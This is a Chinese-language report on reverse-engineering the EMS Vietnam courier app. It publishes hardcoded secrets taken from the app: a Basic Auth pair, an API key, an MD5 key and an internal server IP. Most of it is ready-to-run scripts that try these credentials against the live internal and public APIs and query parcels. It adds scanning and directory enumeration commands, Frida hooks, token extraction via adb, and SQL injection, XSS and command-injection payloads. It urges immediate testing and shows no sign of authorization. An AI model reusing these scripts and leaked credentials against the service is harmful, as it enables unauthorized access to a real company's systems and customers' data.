# EMS Logistics APK 敏感信息分析报告

**分析日期**: 2025-10-16  
**APK**: com.ems.logistics.apk  
**版本**: 1.1.2

---

## 🔥 关键发现总结

### ⚠️ 高危发现

1. **内部API服务器暴露**
   ```
   URL: http://113.190.232.99:8003/api/
   ```
   - ❌ 使用HTTP（未加密）
   - ❌ 内网IP暴露
   - ⚠️ 可能被用于未授权访问

2. **硬编码密钥**
   ```
   MD5 Key: B3EEABB8EE11C2BE770B684D95219ECB
   ```
   - 32位十六进制
   - 可能是API密钥或签名密钥
   - 位置：DEX文件中

---

## 📡 可直接调用的API

### 1. 内部API（来自APK）

**基础URL**: `http://113.190.232.99:8003/api/`

**特点**:
- 无需复杂签名
- 可能只需要简单的认证
- 内部快递员使用

**推测端点**:
```
POST /api/login
  - 快递员登录
  - 可能参数: username, password

POST /api/orders/list
  - 获取订单列表
  - 需要认证token

POST /api/orders/{id}/status
  - 更新订单状态
  - 需要认证token

POST /api/location/update
  - 上传GPS位置
  - 需要认证token

POST /api/upload/image
  - 上传签收照片
  - 需要认证token
```

### 2. 公开API（已知）

**基础URL**: `https://api-dingdong.ems.com.vn/`

**认证方式**:
```
Authorization: Basic bG90dG5ldDpkbXM=  (lottnet:dms)
APIKey: 34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A
Signature: SHA256(运单号大写 + APIKey)
```

**已验证端点**:
```
✅ POST /api/TrackTrace/Lading
✅ POST /api/Delivery/Inquiry
✅ POST /api/Delivery/DeliveryLadingJourney
✅ POST /api/Gateway/Bussiness
```

---

## 🔐 发现的硬编码凭证

### 1. MD5密钥
```
B3EEABB8EE11C2BE770B684D95219ECB
```
**可能用途**:
- API认证
- 数据签名
- 加密密钥

**测试建议**:
```python
# 作为API Key
headers = {
    'Authorization': 'Bearer B3EEABB8EE11C2BE770B684D95219ECB',
    'X-API-Key': 'B3EEABB8EE11C2BE770B684D95219ECB'
}

# 作为签名密钥
import hashlib
signature = hashlib.md5((data + 'B3EEABB8EE11C2BE770B684D95219ECB').encode()).hexdigest()
```

### 2. Basic Auth凭证（公开API）
```
Username: lottnet
Password: dms
Base64: bG90dG5ldDpkbXM=
```

### 3. API Key（公开API）
```
34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A
```

---

## 🎯 可立即测试的API调用

### Test 1: 尝试访问内部API

```python
import requests

# 测试内部API是否可访问
base_url = "http://113.190.232.99:8003/api/"

# 尝试1: 无认证访问
response = requests.get(base_url)
print(f"无认证: {response.status_code}")

# 尝试2: 使用MD5密钥
headers = {
    'X-API-Key': 'B3EEABB8EE11C2BE770B684D95219ECB',
    'Content-Type': 'application/json'
}
response = requests.get(base_url, headers=headers)
print(f"MD5密钥: {response.status_code}")

# 尝试3: 使用公开API的凭证
headers = {
    'Authorization': 'Basic bG90dG5ldDpkbXM=',
    'APIKey': '34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A'
}
response = requests.get(base_url, headers=headers)
print(f"公开凭证: {response.status_code}")
```

### Test 2: 枚举端点

```python
endpoints = [
    'login',
    'auth',
    'orders',
    'tracking',
    'location',
    'upload',
    'profile',
    'settings',
    'api-docs',
    'swagger',
    'health',
    'status'
]

for ep in endpoints:
    try:
        r = requests.get(f"http://113.190.232.99:8003/api/{ep}")
        if r.status_code != 404:
            print(f"✓ Found: {ep} - {r.status_code}")
    except:
        pass
```

### Test 3: 使用已知API

```python
import hashlib

# 已验证可用
API_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

def query_order(tracking):
    sig = hashlib.sha256((tracking.upper() + API_KEY).encode()).hexdigest().upper()
    
    headers = {
        "Authorization": f"Basic {BASIC_AUTH}",
        "APIKey": API_KEY,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    data = {
        "ParcelCode": tracking,
        "Signature": sig
    }
    
    r = requests.post(
        "https://api-dingdong.ems.com.vn/api/Delivery/Inquiry",
        headers=headers,
        data=data
    )
    
    return r.json()

# 使用
result = query_order("EP493018285VN")
print(result)
```

---

## 🔓 无需签名的可能性

### 内部API特点

基于快递员APP的特性，内部API可能：

1. **简单Token认证**
   - 登录后获取JWT token
   - 后续请求携带token
   - 无复杂签名

2. **会话Cookie**
   - 基于Session的认证
   - Cookie存储在APP中
   - 可能被提取复用

3. **设备指纹**
   - 基于设备ID
   - 可能硬编码在APP中
   - 可被模拟

### 提取Token的方法

```bash
# 方法1: 使用Frida Hook网络请求
frida -U -f com.ems.logistics -l hook_network.js

# hook_network.js
Java.perform(function() {
    var OkHttpClient = Java.use("okhttp3.OkHttpClient$Builder");
    OkHttpClient.addInterceptor.implementation = function(interceptor) {
        console.log("Interceptor: " + interceptor);
        return this.addInterceptor(interceptor);
    };
});
```

```bash
# 方法2: 使用Charles/Burp抓包
# 配置代理后运行APP
# 捕获所有请求头和token
```

```bash
# 方法3: 提取SharedPreferences
adb shell run-as com.ems.logistics
cd /data/data/com.ems.logistics/shared_prefs
cat *.xml | grep -E "token|key|auth"
```

---

## 🚨 安全风险评估

### 高危风险

1. **内网API暴露** ⚠️⚠️⚠️
   - 影响: 可能被未授权访问
   - 利用: 直接调用内部API
   - 后果: 数据泄露、系统入侵

2. **HTTP传输** ⚠️⚠️⚠️
   - 影响: 数据未加密
   - 利用: 中间人攻击
   - 后果: 凭证被窃取

3. **硬编码密钥** ⚠️⚠️
   - 影响: 密钥永久泄露
   - 利用: 伪造请求
   - 后果: 系统被滥用

### 中危风险

1. **简单的Basic Auth** ⚠️⚠️
   - lottnet:dms 过于简单
   - 可被暴力破解
   - 建议使用OAuth 2.0

2. **GPS定位追踪** ⚠️
   - 24小时后台定位
   - 隐私泄露风险
   - 需要用户明确授权

---

## 💡 渗透测试建议

### Phase 1: 信息收集

```bash
# 1. 端口扫描
nmap -p 8000-8010 113.190.232.99

# 2. 服务识别
curl -I http://113.190.232.99:8003/

# 3. 目录枚举
gobuster dir -u http://113.190.232.99:8003/ -w wordlist.txt
```

### Phase 2: 认证测试

```python
# 测试不同的认证方式
auth_methods = [
    {},  # 无认证
    {'X-API-Key': 'B3EEABB8EE11C2BE770B684D95219ECB'},
    {'Authorization': 'Basic bG90dG5ldDpkbXM='},
    {'Authorization': 'Bearer B3EEABB8EE11C2BE770B684D95219ECB'},
]

for method in auth_methods:
    r = requests.get('http://113.190.232.99:8003/api/', headers=method)
    print(f"{method}: {r.status_code} - {r.text[:100]}")
```

### Phase 3: API枚举

```python
# 使用常见的API路径
common_apis = [
    '/api/v1/', '/api/v2/',
    '/api/login', '/api/auth',
    '/api/users', '/api/admin',
    '/api/docs', '/api/swagger',
    '/api/orders', '/api/tracking',
    '/api/location', '/api/upload'
]
```

### Phase 4: 参数注入测试

```python
# SQL注入
payload = "' OR '1'='1"

# XSS
payload = "<script>alert(1)</script>"

# 命令注入
payload = "; ls -la"
```

---

## 🛡️ 防御建议

### 给开发团队的建议

1. **立即修复**
   - 🔒 启用HTTPS
   - 🔒 隐藏内网IP
   - 🔒 移除硬编码密钥

2. **认证加固**
   - 实施OAuth 2.0
   - 添加速率限制
   - 使用强密码策略

3. **加密通信**
   - 使用TLS 1.3
   - 实施证书固定
   - 加密敏感数据

4. **代码混淆**
   - 使用DexGuard
   - 加密字符串资源
   - 实施反调试

---

## 📊 对比两套API系统

| 特性 | 公开API (api-dingdong) | 内部API (113.190.232.99) |
|------|------------------------|--------------------------|
| **协议** | HTTPS ✅ | HTTP ❌ |
| **认证** | Basic + APIKey + 签名 | 未知 |
| **用途** | 客户查询 | 快递员操作 |
| **权限** | 只读 | 读写 |
| **安全性** | 中等 | 低 |
| **可访问性** | 公开 | 应该内部 |

---

## 🎬 实战脚本

### 脚本1: 快速测试内部API

```python
#!/usr/bin/env python3
import requests

def test_internal_api():
    base = "http://113.190.232.99:8003/api/"
    
    print("测试内部API...")
    
    # 测试1: 根路径
    try:
        r = requests.get(base, timeout=10)
        print(f"[{r.status_code}] {base}")
        print(f"响应: {r.text[:200]}")
    except Exception as e:
        print(f"错误: {e}")
    
    # 测试2: 常见端点
    endpoints = ['login', 'orders', 'health']
    for ep in endpoints:
        try:
            r = requests.get(f"{base}{ep}", timeout=10)
            if r.status_code != 404:
                print(f"✓ 找到: {ep} - {r.status_code}")
        except:
            pass

if __name__ == "__main__":
    test_internal_api()
```

### 脚本2: 使用所有凭证尝试

```python
#!/usr/bin/env python3
import requests

credentials = [
    {
        'name': 'MD5 Key as Bearer',
        'headers': {
            'Authorization': 'Bearer B3EEABB8EE11C2BE770B684D95219ECB'
        }
    },
    {
        'name': 'MD5 Key as X-API-Key',
        'headers': {
            'X-API-Key': 'B3EEABB8EE11C2BE770B684D95219ECB'
        }
    },
    {
        'name': 'Public API Credentials',
        'headers': {
            'Authorization': 'Basic bG90dG5ldDpkbXM=',
            'APIKey': '34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A'
        }
    }
]

url = "http://113.190.232.99:8003/api/"

for cred in credentials:
    try:
        r = requests.get(url, headers=cred['headers'], timeout=10)
        print(f"{cred['name']}: {r.status_code}")
        if r.status_code == 200:
            print(f"  ✓ 成功! 响应: {r.text[:100]}")
    except Exception as e:
        print(f"{cred['name']}: 错误 - {e}")
```

---

## 📝 总结

### 可立即使用的API

✅ **公开API**: 完全可用
- URL: https://api-dingdong.ems.com.vn/
- 凭证: 已提供
- 签名: SHA256算法
- 用途: 查询订单信息

⚠️ **内部API**: 需要测试
- URL: http://113.190.232.99:8003/api/
- 凭证: 未知（有密钥可尝试）
- 签名: 可能不需要
- 用途: 快递员操作

### 硬编码敏感信息

🔑 **密钥清单**:
1. MD5 Key: `B3EEABB8EE11C2BE770B684D95219ECB`
2. API Key: `34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A`
3. Basic Auth: `lottnet:dms`

### 下一步行动

1. ✅ 测试内部API访问（提供脚本）
2. ✅ 尝试所有硬编码密钥
3. ⏳ 动态调试APP获取token
4. ⏳ 反编译React Native获取完整API列表

---

**创建时间**: 2025-10-16  
**风险等级**: 🔴 HIGH  
**建议行动**: 立即测试内部API可访问性
